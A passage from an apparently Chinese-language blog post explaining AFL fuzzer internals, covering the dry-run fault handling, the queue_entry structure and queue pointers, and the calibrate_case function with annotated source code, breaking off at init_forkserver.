class="string">&quot;Test case &#x27;%s&#x27; does *NOT* crash&quot;</span>, fn);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_TMOUT:  <span class="comment">// 执行超时</span></span><br><span class="line">      <span class="keyword">if</span> (timeout_given) &#123;</span><br><span class="line">        <span class="comment">// timeout_given &gt; 1 表示用户使用了 -t nn+ 语法，允许跳过超时用例</span></span><br><span class="line">        <span class="keyword">if</span> (timeout_given &gt; <span class="number">1</span>) &#123;</span><br><span class="line">          WARNF(<span class="string">&quot;Test case results in a timeout (skipping)&quot;</span>);</span><br><span class="line">          q-&gt;cal_failed = CAL_CHANCES;  <span class="comment">// 标记为校准失败</span></span><br><span class="line">          cal_failures++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 否则，输出详细错误信息并终止</span></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;The program took more than %u ms to &quot;</span></span><br><span class="line">             <span class="string">&quot;process one of the initial test cases.\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    Usually, the right thing to do is to relax the -t option - &quot;</span></span><br><span class="line">             <span class="string">&quot;or to delete it\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    altogether and allow the fuzzer to auto-calibrate. That &quot;</span></span><br><span class="line">             <span class="string">&quot;said, if you know\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    what you are doing and want to simply skip the unruly test &quot;</span></span><br><span class="line">             <span class="string">&quot;cases, append\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    &#x27;+&#x27; at the end of the value passed to -t (&#x27;-t %u+&#x27;).\n&quot;</span>,</span><br><span class="line">             exec_tmout, exec_tmout);</span><br><span class="line"></span><br><span class="line">        FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; results in a timeout&quot;</span>, fn);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有设置超时参数时的错误信息</span></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;The program took more than %u ms to &quot;</span></span><br><span class="line">             <span class="string">&quot;process one of the initial test cases.\n&quot;</span></span><br><span class="line">             <span class="string">&quot;This is bad news; raising the limit with the -t option is &quot;</span></span><br><span class="line">             <span class="string">&quot;possible, but\n&quot;</span></span><br><span class="line">             <span class="string">&quot;will probably make the fuzzing process extremely slow.\n\n&quot;</span></span><br><span class="line">             <span class="string">&quot;If this test case is just a fluke, the other option is to &quot;</span></span><br><span class="line">             <span class="string">&quot;just avoid it\n&quot;</span></span><br><span class="line">             <span class="string">&quot;altogether, and find one that is less of a CPU hog.\n&quot;</span>,</span><br><span class="line">             exec_tmout);</span><br><span class="line"></span><br><span class="line">        FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; results in a timeout&quot;</span>, fn);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_CRASH:  <span class="comment">// 程序崩溃</span></span><br><span class="line">      <span class="comment">// 如果是崩溃模式，这是预期行为</span></span><br><span class="line">      <span class="keyword">if</span> (crash_mode)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果设置了跳过崩溃，则跳过该测试用例</span></span><br><span class="line">      <span class="keyword">if</span> (skip_crashes) &#123;</span><br><span class="line">        WARNF(<span class="string">&quot;Test case results in a crash (skipping)&quot;</span>);</span><br><span class="line">        q-&gt;cal_failed = CAL_CHANCES;</span><br><span class="line">        cal_failures++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 根据是否设置了内存限制，输出不同的错误信息</span></span><br><span class="line">      <span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line">        <span class="comment">// 有内存限制时，提供详细的故障排除建议</span></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Oops, the program crashed with one of the &quot;</span></span><br><span class="line">             <span class="string">&quot;test cases provided. There are\n&quot;</span></span><br><span class="line">             <span class="string">&quot;several possible explanations:\n\n&quot;</span></span><br><span class="line">             <span class="comment">// ... 详细的错误说明和建议 ...</span></span><br><span class="line">             );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 无内存限制时的错误信息</span></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Oops, the program crashed with one of the &quot;</span></span><br><span class="line">             <span class="string">&quot;test cases provided. There are\n&quot;</span></span><br><span class="line">             <span class="string">&quot;several possible explanations:\n\n&quot;</span></span><br><span class="line">             <span class="comment">// ... 错误说明 ...</span></span><br><span class="line">             );</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; results in a crash&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_ERROR:  <span class="comment">// 无法执行目标程序</span></span><br><span class="line">      FATAL(<span class="string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_NOINST:  <span class="comment">// 没有检测到插桩</span></span><br><span class="line">      FATAL(<span class="string">&quot;No instrumentation detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_NOBITS:  <span class="comment">// 没有新的覆盖信息</span></span><br><span class="line">      useless_at_start++;  <span class="comment">// 记录无用测试用例数量</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 如果不在bitmap中且没有随机化队列，发出警告</span></span><br><span class="line">      <span class="keyword">if</span> (!in_bitmap &amp;&amp; !shuffle_queue)</span><br><span class="line">        WARNF(<span class="string">&quot;No new instrumentation output, test case may be useless.&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果插桩输出在不同运行间有差异，发出警告</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;var_behavior)</span><br><span class="line">      WARNF(<span class="string">&quot;Instrumentation output varies across runs.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移动到下一个测试用例</span></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理校准失败的情况</span></span><br><span class="line">  <span class="keyword">if</span> (cal_failures) &#123;</span><br><span class="line">    <span class="comment">// 如果所有测试用例都失败，终止程序</span></span><br><span class="line">    <span class="keyword">if</span> (cal_failures == queued_paths)</span><br><span class="line">      FATAL(<span class="string">&quot;All test cases time out%s, giving up!&quot;</span>,</span><br><span class="line">            skip_crashes ? <span class="string">&quot; or crash&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出跳过的测试用例统计</span></span><br><span class="line">    WARNF(<span class="string">&quot;Skipped %u test cases (%0.02f%%) due to timeouts%s.&quot;</span>, cal_failures,</span><br><span class="line">          ((<span class="keyword">double</span>)cal_failures) * <span class="number">100</span> / queued_paths,</span><br><span class="line">          skip_crashes ? <span class="string">&quot; or crashes&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果失败比例超过20%，发出警告</span></span><br><span class="line">    <span class="keyword">if</span> (cal_failures * <span class="number">5</span> &gt; queued_paths)</span><br><span class="line">      WARNF(cLRD <span class="string">&quot;High percentage of rejected test cases, check settings!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 所有测试用例处理完成</span></span><br><span class="line">  OKF(<span class="string">&quot;All test cases processed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在详细看这些函数的过程前让我们先看看queue_entry这个结构体,以及相关的队列指针 </p><h3 id="queue-entry"><a href="#queue-entry" class="headerlink" title="queue_entry"></a>queue_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> &#123;</span></span><br><span class="line">  <span class="comment">/* ========== 基本信息 ========== */</span></span><br><span class="line">  </span><br><span class="line">  u8 *fname;        <span class="comment">/* 测试用例的文件名（完整路径）</span></span><br><span class="line"><span class="comment">                     * 例如: &quot;out_dir/queue/id:000001,orig:seed1.txt&quot;</span></span><br><span class="line"><span class="comment">                     * 用于从磁盘读取测试用例内容 */</span></span><br><span class="line">  </span><br><span class="line">  u32 len;          <span class="comment">/* 输入文件的长度（字节数）</span></span><br><span class="line"><span class="comment">                     * 用于内存分配和文件读写</span></span><br><span class="line"><span class="comment">                     * AFL会根据这个值来优化内存使用 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 状态标志位 ========== */</span></span><br><span class="line">  </span><br><span class="line">  u8 cal_failed;    <span class="comment">/* 校准是否失败？</span></span><br><span class="line"><span class="comment">                     * 0: 校准成功</span></span><br><span class="line"><span class="comment">                     * &gt;0: 失败次数，达到CAL_CHANCES(3次)后放弃</span></span><br><span class="line"><span class="comment">                     * 失败原因可能是超时、崩溃等 */</span></span><br><span class="line">      </span><br><span class="line">  u8 trim_done;     <span class="comment">/* 是否已经完成修剪（trim）？</span></span><br><span class="line"><span class="comment">                     * 0: 未修剪</span></span><br><span class="line"><span class="comment">                     * 1: 已修剪</span></span><br><span class="line"><span class="comment">                     * 修剪是指删除不影响覆盖率的冗余字节 */</span></span><br><span class="line">      </span><br><span class="line">  u8 was_fuzzed;    <span class="comment">/* 是否已经进行过模糊测试？</span></span><br><span class="line"><span class="comment">                     * 0: 未测试</span></span><br><span class="line"><span class="comment">                     * 1: 已测试</span></span><br><span class="line"><span class="comment">                     * 用于追踪队列进度 */</span></span><br><span class="line">      </span><br><span class="line">  u8 passed_det;    <span class="comment">/* 是否已通过确定性阶段？</span></span><br><span class="line"><span class="comment">                     * 0: 未通过</span></span><br><span class="line"><span class="comment">                     * 1: 已通过</span></span><br><span class="line"><span class="comment">                     * 确定性阶段包括bit翻转、算术运算等固定变异策略 */</span></span><br><span class="line">      </span><br><span class="line">  u8 has_new_cov;   <span class="comment">/* 是否触发了新的代码覆盖？</span></span><br><span class="line"><span class="comment">                     * 0: 没有新覆盖</span></span><br><span class="line"><span class="comment">                     * 1: 有新覆盖（发现了virgin_bits中的新路径）</span></span><br><span class="line"><span class="comment">                     * 这是评估测试用例价值的关键指标 */</span></span><br><span class="line">      </span><br><span class="line">  u8 var_behavior;  <span class="comment">/* 是否表现出变化行为？</span></span><br><span class="line"><span class="comment">                     * 0: 行为稳定（每次执行路径相同）</span></span><br><span class="line"><span class="comment">                     * 1: 行为不稳定（多次执行路径不同）</span></span><br><span class="line"><span class="comment">                     * 可能由随机性、时间依赖、并发等因素导致 */</span></span><br><span class="line">      </span><br><span class="line">  u8 favored;       <span class="comment">/* 当前是否被标记为&quot;受青睐&quot;？</span></span><br><span class="line"><span class="comment">                     * 0: 普通测试用例</span></span><br><span class="line"><span class="comment">                     * 1: 受青睐（在minimize_corpus中被选中）</span></span><br><span class="line"><span class="comment">                     * 受青睐的用例会获得更多fuzzing时间 */</span></span><br><span class="line">      </span><br><span class="line">  u8 fs_redundant;  <span class="comment">/* 在文件系统中是否被标记为冗余？</span></span><br><span class="line"><span class="comment">                     * 0: 非冗余</span></span><br><span class="line"><span class="comment">                     * 1: 冗余（可以被其他用例覆盖）</span></span><br><span class="line"><span class="comment">                     * 用于corpus最小化 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 执行统计信息 ========== */</span></span><br><span class="line">  </span><br><span class="line">  u32 bitmap_size;  <span class="comment">/* 位图中设置的位数（覆盖的边数量）</span></span><br><span class="line"><span class="comment">                     * 表示这个测试用例覆盖了多少条程序执行路径</span></span><br><span class="line"><span class="comment">                     * 值越大说明覆盖率越高 */</span></span><br><span class="line">      </span><br><span class="line">  u32 exec_cksum;   <span class="comment">/* 执行路径的校验和</span></span><br><span class="line"><span class="comment">                     * 通过hash32(trace_bits)计算得出</span></span><br><span class="line"><span class="comment">                     * 用于快速比较两次执行是否产生相同路径</span></span><br><span class="line"><span class="comment">                     * 如果为0，表示还未执行过 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 性能指标 ========== */</span></span><br><span class="line">  </span><br><span class="line">  u64 exec_us;      <span class="comment">/* 执行时间（微秒）</span></span><br><span class="line"><span class="comment">                     * 单次执行的平均时间</span></span><br><span class="line"><span class="comment">                     * 用于计算fuzzing效率和时间分配</span></span><br><span class="line"><span class="comment">                     * 执行快的用例会获得更多变异机会 */</span></span><br><span class="line">      </span><br><span class="line">  u64 handicap;     <span class="comment">/* 队列轮次落后数</span></span><br><span class="line"><span class="comment">                     * 表示这个用例落后了多少轮fuzzing</span></span><br><span class="line"><span class="comment">                     * 用于实现公平调度，确保所有用例都能被测试</span></span><br><span class="line"><span class="comment">                     * 值越大，优先级越高 */</span></span><br><span class="line">      </span><br><span class="line">  u64 depth;        <span class="comment">/* 路径深度</span></span><br><span class="line"><span class="comment">                     * 从初始种子到当前用例的变异代数</span></span><br><span class="line"><span class="comment">                     * depth=0: 初始种子</span></span><br><span class="line"><span class="comment">                     * depth=n: 经过n代变异得到</span></span><br><span class="line"><span class="comment">                     * 用于评估测试用例的&quot;血统&quot; */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 内存优化 ========== */</span></span><br><span class="line">  </span><br><span class="line">  u8 *trace_mini;   <span class="comment">/* 压缩的路径跟踪信息</span></span><br><span class="line"><span class="comment">                     * 当内存紧张时，保存简化版的trace_bits</span></span><br><span class="line"><span class="comment">                     * 只保存关键路径信息，节省内存</span></span><br><span class="line"><span class="comment">                     * NULL表示未保存 */</span></span><br><span class="line">      </span><br><span class="line">  u32 tc_ref;       <span class="comment">/* trace_mini的引用计数</span></span><br><span class="line"><span class="comment">                     * 多个queue_entry可能共享同一个trace_mini</span></span><br><span class="line"><span class="comment">                     * 用于内存管理和去重</span></span><br><span class="line"><span class="comment">                     * 当ref=0时可以释放 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 链表指针 ========== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">next</span>;</span>     <span class="comment">/* 指向下一个队列元素</span></span><br><span class="line"><span class="comment">                                 * 用于构建单向链表</span></span><br><span class="line"><span class="comment">                                 * NULL表示队列末尾 */</span></span><br><span class="line">      </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">next_100</span>;</span> <span class="comment">/* 指向100个元素之后的条目</span></span><br><span class="line"><span class="comment">                                * 快速跳转指针，加速队列遍历</span></span><br><span class="line"><span class="comment">                                * 用于大队列的性能优化</span></span><br><span class="line"><span class="comment">                                * 可以快速跳过大量元素 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ========== 主队列管理 ========== */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">queue</span>;</span>    </span><br><span class="line"><span class="comment">/* Fuzzing队列的头指针（链表头）</span></span><br><span class="line"><span class="comment"> * 指向第一个测试用例</span></span><br><span class="line"><span class="comment"> * 整个fuzzing过程围绕这个队列进行</span></span><br><span class="line"><span class="comment"> * 新发现的interesting用例会添加到队列末尾 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">queue_cur</span>;</span></span><br><span class="line"><span class="comment">/* 队列中的当前位置指针</span></span><br><span class="line"><span class="comment"> * 指向正在处理的测试用例</span></span><br><span class="line"><span class="comment"> * fuzzing循环通过移动这个指针遍历队列</span></span><br><span class="line"><span class="comment"> * 到达末尾后会重新回到开头（循环队列） */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">queue_top</span>;</span></span><br><span class="line"><span class="comment">/* 队列末尾指针</span></span><br><span class="line"><span class="comment"> * 指向最后一个测试用例</span></span><br><span class="line"><span class="comment"> * 用于快速添加新元素到队列末尾</span></span><br><span class="line"><span class="comment"> * 避免每次都遍历整个链表 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q_prev100</span>;</span></span><br><span class="line"><span class="comment">/* 前100个元素的标记指针</span></span><br><span class="line"><span class="comment"> * 配合next_100使用，实现快速跳转</span></span><br><span class="line"><span class="comment"> * 当队列很长时（数千个用例），可以快速定位</span></span><br><span class="line"><span class="comment"> * 维护一个每100个元素的&quot;索引&quot; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ========== 覆盖率优化 ========== */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">top_rated</span>[<span class="title">MAP_SIZE</span>];</span></span><br><span class="line"><span class="comment">/* 位图每个字节的最佳测试用例数组</span></span><br><span class="line"><span class="comment"> * MAP_SIZE通常是64KB（65536）</span></span><br><span class="line"><span class="comment"> * top_rated[i]指向最能覆盖位图第i个字节的测试用例</span></span><br><span class="line"><span class="comment"> * 用于corpus最小化和favored标记</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 工作原理：</span></span><br><span class="line"><span class="comment"> * - 对于trace_bits的每个字节位置</span></span><br><span class="line"><span class="comment"> * - 找出能覆盖该位置且执行最快的测试用例</span></span><br><span class="line"><span class="comment"> * - 将其指针存储在top_rated对应位置</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 用途：</span></span><br><span class="line"><span class="comment"> * 1. minimize_corpus: 选择最小测试集</span></span><br><span class="line"><span class="comment"> * 2. 计算favored: 标记高价值用例</span></span><br><span class="line"><span class="comment"> * 3. 加速fuzzing: 优先测试高效用例</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>这里从queue中读取第一个测试样例然后读取测试用例内容到内存，然后调用calibrate_case 函数</p><h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h3><p><code>calibrate_case</code> 是AFL模糊测试器中的核心校准函数，负责多次执行测试用例以收集稳定的覆盖率信息，检测路径变化，并计算执行性能指标。这个函数对每个测试用例进行多轮执行，以确保获得可靠的基准数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="keyword">char</span> **argv, struct queue_entry *q, u8 *use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 静态数组，保存第一次执行的路径跟踪信息</span></span><br><span class="line">  <span class="keyword">static</span> u8 first_trace[MAP_SIZE];</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 初始化各种标志变量：</span></span><br><span class="line">  u8 fault = <span class="number">0</span>,           <span class="comment">// 执行故障类型</span></span><br><span class="line">     new_bits = <span class="number">0</span>,        <span class="comment">// 新覆盖的路径级别（0=无，1=命中数变化，2=新路径）</span></span><br><span class="line">     var_detected = <span class="number">0</span>,    <span class="comment">// 是否检测到变化的路径</span></span><br><span class="line">     hnb = <span class="number">0</span>,            <span class="comment">// has_new_bits的返回值</span></span><br><span class="line">     first_run = (q-&gt;exec_cksum == <span class="number">0</span>);  <span class="comment">// 是否第一次运行（通过校验和判断）</span></span><br><span class="line">  </span><br><span class="line">  u64 start_us, stop_us;  <span class="comment">// 计时变量</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 保存当前阶段信息（用于恢复）</span></span><br><span class="line">  s32 old_sc = stage_cur, old_sm = stage_max;</span><br><span class="line">  u32 use_tmout = exec_tmout;  <span class="comment">// 使用的超时时间</span></span><br><span class="line">  u8 *old_sn = stage_name;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 对于恢复的会话或已添加的测试用例，使用更宽松的超时时间</span></span><br><span class="line"><span class="comment">     这有助于避免间歇性延迟导致的问题 */</span></span><br><span class="line">  <span class="keyword">if</span> (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,     <span class="comment">// 增加固定值</span></span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC / <span class="number">100</span>); <span class="comment">// 或按百分比增加</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 增加校准失败计数（如果成功会在后面清零）</span></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置当前阶段信息</span></span><br><span class="line">  stage_name = <span class="string">&quot;calibration&quot;</span>;</span><br><span class="line">  stage_max = fast_cal ? <span class="number">3</span> : CAL_CYCLES;  <span class="comment">// 快速模式3轮，正常模式8轮（CAL_CYCLES）</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 确保fork服务器已启动（如果使用的话）</span></span><br><span class="line"><span class="comment">     不将fork服务器的启动时间计入校准时间 */</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    init_forkserver(argv);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果之前已经执行过（有校验和），保存当前跟踪位图并检查新位</span></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">    hnb = has_new_bits(virgin_bits);  <span class="comment">// 检查是否有新的覆盖</span></span><br><span class="line">    <span class="keyword">if</span> (hnb &gt; new_bits)</span><br><span class="line">      new_bits = hnb;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 开始计时</span></span><br><span class="line">  start_us = get_cur_time_us();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 执行多轮校准循环</span></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line">    u32 cksum;  <span class="comment">// 当前执行的路径校验和</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定期更新统计显示（非首次运行时）</span></span><br><span class="line">    <span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq))</span><br><span class="line">      show_stats();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将测试用例写入文件（供目标程序读取）</span></span><br><span class="line">    write_to_testcase(use_mem, q-&gt;len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行目标程序并获取故障状态</span></span><br><span class="line">    fault = run_target(argv, use_tmout);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查是否需要快速退出</span></span><br><span class="line"><span class="comment">       stop_soon由Ctrl+C信号处理器设置 */</span></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || fault != crash_mode)</span><br><span class="line">      <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第一轮执行时，检查是否有插桩输出</span></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;</span><br><span class="line">      fault = FAULT_NOINST;  <span class="comment">// 没有插桩</span></span><br><span class="line">      <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算当前路径的哈希校验和</span></span><br><span class="line">    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果校验和与之前不同，说明路径有变化</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 检查是否覆盖了新的路径</span></span><br><span class="line">      hnb = has_new_bits(virgin_bits);</span><br><span class="line">      <span class="keyword">if</span> (hnb &gt; new_bits)</span><br><span class="line">        new_bits = hnb;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line">        <span class="comment">// 不是第一次执行，但路径变化了，标记变化的字节</span></span><br><span class="line">        u32 i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line">          <span class="comment">// 如果该字节之前没有变化过，但现在不同了</span></span><br><span class="line">          <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;</span><br><span class="line">            var_bytes[i] = <span class="number">1</span>;  <span class="comment">// 标记为变化字节</span></span><br><span class="line">            stage_max = CAL_CYCLES_LONG;  <span class="comment">// 延长校准轮数到40轮</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        var_detected = <span class="number">1</span>;  <span class="comment">// 标记检测到变化</span></span><br><span class="line">        </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 第一次执行，保存校验和和路径信息</span></span><br><span class="line">        q-&gt;exec_cksum = cksum;</span><br><span class="line">        <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 结束计时</span></span><br><span class="line">  stop_us = get_cur_time_us();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 更新全局统计</span></span><br><span class="line">  total_cal_us += stop_us - start_us;      <span class="comment">// 总校准时间</span></span><br><span class="line">  total_cal_cycles += stage_max;           <span class="comment">// 总校准轮数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 收集性能统计信息</span></span><br><span class="line"><span class="comment">     这些信息用于calculate_score()中的模糊测试时间分配计算 */</span></span><br><span class="line">  q-&gt;exec_us = (stop_us - start_us) / stage_max;  <span class="comment">// 平均执行时间</span></span><br><span class="line">  q-&gt;bitmap_size = count_bytes(trace_bits);       <span class="comment">// 覆盖的路径数量</span></span><br><span class="line">  q-&gt;handicap = handicap;                         <span class="comment">// 表示这个用例落后了多少轮fuzzing</span></span><br><span class="line">  q-&gt;cal_failed = <span class="number">0</span>;                              <span class="comment">// 清除失败标记</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 更新全局位图统计</span></span><br><span class="line">  total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 更新位图得分（用于测试用例优先级排序）</span></span><br><span class="line">  update_bitmap_score(q);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果首次运行没有产生新的覆盖，设置相应的故障标记</span></span><br><span class="line"><span class="comment">     这是一个非关键问题，但需要警告用户 */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits)</span><br><span class="line">    fault = FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果发现了新的覆盖路径，更新队列统计</span></span><br><span class="line">  <span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov = <span class="number">1</span>;      <span class="comment">// 标记有新覆盖</span></span><br><span class="line">    queued_with_cov++;       <span class="comment">// 增加有覆盖的队列项计数</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 处理变化路径 */</span></span><br><span class="line">  <span class="keyword">if</span> (var_detected) &#123;</span><br><span class="line">    <span class="comment">// 统计变化字节数量</span></span><br><span class="line">    var_byte_count = count_bytes(var_bytes);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;var_behavior) &#123;</span><br><span class="line">      mark_as_variable(q);   <span class="comment">// 标记为变化行为</span></span><br><span class="line">      queued_variable++;     <span class="comment">// 增加变化队列项计数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 恢复阶段信息</span></span><br><span class="line">  stage_name = old_sn;</span><br><span class="line">  stage_cur = old_sc;</span><br><span class="line">  stage_max = old_sm;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 非首次运行时显示统计</span></span><br><span class="line">  <span class="keyword">if</span> (!first_run)</span><br><span class="line">    show_stats();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> fault;  <span class="comment">// 返回故障状态</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数先设置一些变量然后检查fork服务器是否开启，如果没有开启则调用</p><h4 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span 